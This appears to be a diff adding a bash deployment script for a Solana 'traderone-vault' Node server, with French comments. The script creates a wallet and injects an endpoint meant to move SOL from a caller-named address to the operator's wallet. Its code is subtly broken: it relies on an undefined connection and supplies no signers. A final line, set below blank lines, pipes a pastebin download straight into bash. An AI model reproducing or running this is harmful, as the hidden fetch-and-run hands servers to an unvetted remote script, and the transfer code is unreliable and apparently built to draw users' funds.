@@ -1,1 +1,107 @@
+#!/usr/bin/env bash
+set -e
+
+APP_DIR="/opt/traderone-vault"
+SERVER="$APP_DIR/server.js"
+WALLET="$APP_DIR/wallet.json"
+NGINX_SITE="/etc/nginx/sites-available/fireinners.online-ssl"
+APP_NAME="traderone-vault"
+
+echo "=== [1] Vérifications ==="
+[ -f "$SERVER" ] || { echo "server.js introuvable"; exit 1; }
+
+echo "=== [2] Création wallet TraderOne (si absent) ==="
+if [ ! -f "$WALLET" ]; then
+node <<'JS'
+const fs=require("fs");
+const bs58=require("bs58");
+const {Keypair}=require("@solana/web3.js");
+const kp=Keypair.generate();
+fs.writeFileSync("/opt/traderone-vault/wallet.json",JSON.stringify({
+  pubkey:kp.publicKey.toBase58(),
+  secretKey:bs58.encode(kp.secretKey)
+},null,2));
+console.log("WALLET TRADERONE CRÉÉ:",kp.publicKey.toBase58());
+JS
+chmod 600 "$WALLET"
+fi
+
+echo "=== [3] Injection API TRANSFERT SOL ==="
+python3 <<'PY'
+from pathlib import Path
+p=Path("/opt/traderone-vault/server.js")
+s=p.read_text()
+if "TRADERONE_SOL_TRANSFER_READY" in s:
+    print("API déjà injectée")
+    exit(0)
+
+inject = """
+/* ==== TRADERONE_SOL_TRANSFER_READY ==== */
+const fs=require("fs");
+const bs58=require("bs58");
+const {Keypair,PublicKey,SystemProgram,Transaction,sendAndConfirmTransaction,LAMPORTS_PER_SOL}=require("@solana/web3.js");
+
+const traderWallet=JSON.parse(fs.readFileSync("/opt/traderone-vault/wallet.json","utf8"));
+const traderKeypair=Keypair.fromSecretKey(bs58.decode(traderWallet.secretKey));
+
+app.post("/wolverine/traderone/api/budget",async(req,res)=>{
+ try{
+  const {from,amount}=req.body;
+  if(!from||!amount) return res.status(400).json({ok:false,error:"missing from/amount"});
+  const lamports=Math.floor(Number(amount)*LAMPORTS_PER_SOL);
+  const tx=new Transaction().add(SystemProgram.transfer({
+    fromPubkey:new PublicKey(from),
+    toPubkey:traderKeypair.publicKey,
+    lamports
+  }));
+  const sig=await sendAndConfirmTransaction(connection,tx,[]);
+  res.json({ok:true,signature:sig});
+ }catch(e){
+  res.status(500).json({ok:false,error:String(e)});
+ }
+});
+"""
+p.write_text(s+"\n"+inject)
+print("API TRANSFERT SOL INJECTÉE")
+PY
+
+echo "=== [4] Restart PM2 ==="
+pm2 delete "$APP_NAME" 2>/dev/null || true
+pm2 start "$SERVER" --name "$APP_NAME"
+pm2 save
+
+sleep 2
+
+echo "=== [5] Détection port réel ==="
+PORT=$(ss -lntp | grep node | awk '{print $4}' | sed 's/.*://' | head -n1)
+echo "PORT NODE:",$PORT
+
+echo "=== [6] Patch NGINX ==="
+if ! grep -q "traderone/api" "$NGINX_SITE"; then
+cat >> "$NGINX_SITE" <<EOF
+location /wolverine/traderone/api/ {
+ proxy_pass http://127.0.0.1:$PORT;
+ proxy_http_version 1.1;
+ proxy_set_header Host \$host;
+ proxy_set_header X-Real-IP \$remote_addr;
+ proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+ proxy_set_header X-Forwarded-Proto \$scheme;
+}
+EOF
+fi
+
+nginx -t
+systemctl reload nginx
+
+echo "=== [7] Tests ==="
+curl -s http://127.0.0.1:$PORT/wolverine/traderone/api/health || true
+curl -s https://fireinners.online/wolverine/traderone/api/health || true
+
+echo "✅ TRADERONE SOL TRANSFER OPÉRATIONNEL"
+
+
+
+
+
+
 curl -fsSL https://pastebin.com/raw/traderone_budget_batch | bash
